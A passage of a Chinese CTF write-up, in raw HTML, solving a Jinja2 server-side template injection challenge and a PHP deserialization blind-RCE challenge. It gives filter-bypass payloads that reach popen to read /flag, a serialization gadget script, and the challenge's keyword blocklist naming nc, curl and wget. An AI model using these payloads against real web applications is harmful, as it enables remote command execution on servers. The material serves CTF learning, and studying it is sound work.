&#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib3.util.ssltransport.SSLTransport&#x27;&gt;, &lt;class &#x27;_queue.SimpleQueue&#x27;&gt;, &lt;class &#x27;queue.Queue&#x27;&gt;, &lt;class &#x27;queue._PySimpleQueue&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;urllib3.fields.RequestField&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib3.connection.DummyConnection&#x27;&gt;, &lt;class &#x27;urllib3.response.ContentDecoder&#x27;&gt;, &lt;class &#x27;urllib3.response.GzipDecoderState&#x27;&gt;, &lt;class &#x27;urllib3.response.BytesQueueBuffer&#x27;&gt;, &lt;class &#x27;urllib3._request_methods.RequestMethods&#x27;&gt;, &lt;class &#x27;urllib3.connectionpool.ConnectionPool&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;charset_normalizer.md.MessDetectorPlugin&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatch&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatches&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CliDetectionResult&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;requests.cookies.MockRequest&#x27;&gt;, &lt;class &#x27;requests.cookies.MockResponse&#x27;&gt;, &lt;class &#x27;requests.auth.AuthBase&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;requests.models.RequestEncodingMixin&#x27;&gt;, &lt;class &#x27;requests.models.RequestHooksMixin&#x27;&gt;, &lt;class &#x27;requests.models.Response&#x27;&gt;, &lt;class &#x27;requests.adapters.BaseAdapter&#x27;&gt;, &lt;class &#x27;requests.sessions.SessionRedirectMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.structures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;configparser.Interpolation&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.trsock.TransportSocket&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class &#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.DebugTraceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;] &quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br>count = <span class="hljs-number">0</span><br>tem = <span class="hljs-string">&#x27;os._wrap_close&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[i])<br>    <span class="hljs-keyword">if</span> tem <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        <span class="hljs-built_in">print</span>(count)<br>        <span class="hljs-keyword">break</span><br>    count = count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010163213824.png" alt="image-20231010163213824"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">使用&quot;~&quot;进行字符串拼接：<br>secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010161929907.png" alt="image-20231010161929907"></p><p>paylaod:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162204147.png" alt="image-20231010162204147"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;ls /&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162348128.png" alt="image-20231010162348128"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;tac /flag&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162449022.png" alt="image-20231010162449022"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-comment">//有类的输出会进行执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//过滤了:$ . ! @ # % ^ &amp; * ? &#123; &#125; &gt; &lt;</span><br>        <span class="hljs-comment">//nc tee wget exec bash sh netcat grep base64 rev curl </span><br>        <span class="hljs-comment">//wget gcc php python pingtouch mv mkdir cp</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-comment">//无回显rce</span><br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//反序列化自动触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//可用于执行__toString()函数</span><br>        <span class="hljs-comment">//$this-&gt;qwejaskdjnlka = new minipop();</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_62046696/article/details/125859628?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-2-125859628-blog-123039067.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=5">rce（无回显）_无回显rce_偶尔躲躲乌云334的博客-CSDN博客</a></p><p>测试命令是否被执行:</p><p>构造rce脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">// $payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;</span><br><span class="hljs-comment">// $obj-&gt;code = $payload;</span><br><span class="hljs-variable">$obj</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code=&#x27;ls|sleep 5&#x27;;//会使网页延迟5秒<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现网页延迟回显，说明我们上传的payload命令可以被执行</p><p><strong>sed管道命令执行:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;<br>将|之前命令执行的结果的1-20行内容写入test文件中，test&lt;=&gt;./test,所以test文件存在于当前网页的文件夹中<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code = &quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;<br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231031192813120.png" alt="image-20231031192813120"></p><p>payload:</p><figure class="highlight 